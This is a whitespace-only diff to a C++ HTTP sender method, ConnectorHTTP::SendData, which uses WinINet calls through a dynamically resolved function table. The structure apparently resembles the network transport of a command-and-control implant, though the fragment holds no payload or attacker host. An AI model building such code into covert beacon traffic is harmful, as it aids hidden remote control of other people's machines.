@@ -88,9 +88,9 @@ BYTE* ConnectorHTTP::SendData(PBYTE data, ULONG data_size, ULONG* recv_size)
 			DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 			if ( this->ssl )
 				flags |= INTERNET_FLAG_SECURE;
+
 			HINTERNET hRequest = this->functions->HttpOpenRequestA(hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
 			if ( hRequest ) {
-
 				if ( this->ssl ) {
 					DWORD dwFlags;
 					DWORD dwBuffer = sizeof(DWORD);
@@ -101,22 +101,22 @@ BYTE* ConnectorHTTP::SendData(PBYTE data, ULONG data_size, ULONG* recv_size)
 					}
 				}
 				BOOL result = this->functions->HttpSendRequestA( hRequest, this->headers, strlen(headers), data, data_size );
-				if ( result ) {
 
+				if ( result ) {
 					char statusCode[255];
 					DWORD statusCodeLenght = 255;
 					result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
+					
 					if ( result && _atoi(statusCode) == 200 ) {
-
 						DWORD dwLengthDataSize = sizeof(DWORD);
 						DWORD answerSize = 0;
 						result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
+						
 						if ( result ) {
-
 							DWORD dwNumberOfBytesAvailable = 0;
 							result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+							
 							if ( result && answerSize >= 0 ) {
-
 								ULONG numberReadedBytes = 0;
 								DWORD readedBytes = 0;
 								BYTE* buffer = (BYTE*)this->functions->LocalAlloc( LPTR, answerSize );
